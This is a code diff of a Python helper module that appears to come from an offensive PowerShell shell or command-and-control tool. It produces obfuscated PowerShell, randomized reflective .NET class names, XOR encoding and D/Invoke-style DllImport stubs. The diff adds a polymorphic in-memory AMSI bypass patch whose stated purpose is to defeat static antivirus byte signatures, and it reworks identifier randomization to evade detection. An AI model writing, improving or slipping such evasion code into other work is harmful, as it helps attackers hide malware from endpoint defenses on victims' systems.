@@ -2,22 +2,23 @@
 shell.commands — helper functions, reflective .NET identifiers, dll_import
 """
 
-from base64 import b64encode, b64decode
-from random import randbytes, randint
+import secrets
 import shlex
+from base64 import b64encode, b64decode
+from typing import List, Tuple, Any, Generator
 
 
 # ── helpers ───────────────────────────────────────────────────────────────────
-def chunks(xs, n):
+def chunks(xs: bytes | list, n: int) -> Generator:
     for off in range(0, len(xs), n):
         yield xs[off:off+n]
 
-def b64str(s):
+def b64str(s: str | bytes) -> str:
     if isinstance(s, str):
         return b64encode(s.encode()).decode()
     return b64encode(s).decode()
 
-def split_args(cmdline):
+def split_args(cmdline: str) -> List[str]:
     try:
         args = shlex.split(cmdline, posix=False)
     except ValueError:
@@ -28,16 +29,37 @@ def split_args(cmdline):
         for a in args
     ]
 
-def xorenc(xs, key):
+def xorenc(xs: bytes | bytearray, key: int) -> bytes:
     return bytes(x ^ key for x in xs)
 
-def str_b64(arg):
+def str_b64(arg: str | bytes) -> str:
     return f"([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64str(arg)}')))"
 
 
-# ── random identifiers used for reflective .NET loading ──────────────────────
-_ns          = "A" + randbytes(randint(3,8)).hex()
-_host_writer = "H" + randbytes(randint(3,8)).hex()
+# ── polymorphic AMSI patch builder (FIX-04) ──────────────────────────────────
+def build_amsi_patch() -> Tuple[str, int, int]:
+    """
+    Generates a polymorphic in-memory AMSI patch.
+    Uses randomized NOP-equivalent instructions to defeat static byte signatures.
+    Returns (arr_str, patch_len, offset).
+    """
+    nop_variants = [
+        b'\x90',                # nop
+        b'\x87\xdb',            # xchg ebx, ebx
+        b'\x66\x90',            # 2-byte nop (xchg ax, ax)
+        b'\x0f\x1f\x00',        # 3-byte nop
+        b'\x89\xc0',            # mov eax, eax
+    ]
+    prefix = secrets.choice(nop_variants)
+    # mov eax, 0x80070057; ret
+    stub = prefix + b'\xb8\x57\x00\x07\x80\xc3'
+    arr = ','.join(f'0x{b:02x}' for b in stub)
+    return arr, len(stub), len(prefix)
+
+
+# ── CSPRNG identifiers used for reflective .NET loading (FIX-05) ─────────────
+_ns          = "A" + secrets.token_hex(secrets.randbelow(6) + 3)
+_host_writer = "H" + secrets.token_hex(secrets.randbelow(6) + 3)
 
 new_HostWriter    = f"(New-Object {_ns}.{_host_writer} {{ Write-Host -NoNewLine $args }})"
 import_HostWriter = f"""
@@ -54,8 +76,8 @@ public override System.Text.Encoding Encoding {{ get {{ return System.Text.Encod
 }}
 "@"""
 
-_xor_enc = "X" + randbytes(randint(3,8)).hex()
-_xor_key = randint(1,255)
+_xor_enc = "X" + secrets.token_hex(secrets.randbelow(6) + 3)
+_xor_key = secrets.randbelow(254) + 1  # range [1, 254], never 0 (FIX-05)
 call_XorEnc   = f"[{_ns}.{_xor_enc}]::x"
 import_XorEnc = f"""
 Add-Type @"
@@ -70,7 +92,7 @@ return y;
 "@
 """
 
-_path_fix    = "P" + randbytes(randint(3,8)).hex()
+_path_fix    = "P" + secrets.token_hex(secrets.randbelow(6) + 3)
 _new_PathFix = f"(New-Object {_ns}.{_path_fix})"
 _importPathFix = f"""
 Add-Type @"
@@ -87,11 +109,11 @@ return base.GetBytes(s);
 
 
 # ── dll_import: generates D/Invoke-style Add-Type payloads ───────────────────
-def dll_import(ns, lib, fun, sigs):
-    cls   = f"f{randbytes(randint(3,8)).hex()}"
-    name  = f"g{randbytes(randint(3,8)).hex()}"
+def dll_import(ns: str, lib: str, fun: str, sigs: List[str]):
+    cls   = f"f{secrets.token_hex(secrets.randbelow(6) + 3)}"
+    name  = f"g{secrets.token_hex(secrets.randbelow(6) + 3)}"
     ret   = sigs[0]
-    args  = ", ".join(f"{ty} x{randbytes(2).hex()}" for ty in sigs[1:])
+    args  = ", ".join(f"{ty} x{secrets.token_hex(2)}" for ty in sigs[1:])
     dll   = "+".join(f'"{c_}"' for c_ in lib)
     entry = "+".join(f'"{c_}"' for c_ in fun)
     code  = f'[DllImport({dll},EntryPoint={entry})] public static extern {ret} {name}({args});'
